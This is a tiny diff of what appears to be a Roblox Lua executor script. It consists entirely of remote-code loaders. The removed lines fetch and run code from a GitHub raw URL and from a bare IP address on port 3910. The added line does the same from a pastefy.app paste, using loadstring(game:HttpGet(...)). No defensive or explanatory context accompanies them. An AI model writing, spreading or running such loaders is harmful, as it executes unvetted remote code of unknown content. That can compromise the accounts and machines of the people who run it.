@@ -1,3 +1,1 @@
-ID="ee6df96e-9ce2-4850-b255-bf03308470e3";
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/dad"));
-loadstring(game:HttpGet("http://72.56.90.233:3910/cdn/loader.luau"))();
+loadstring(game:HttpGet("https://pastefy.app/tobsKdzw/raw"))()
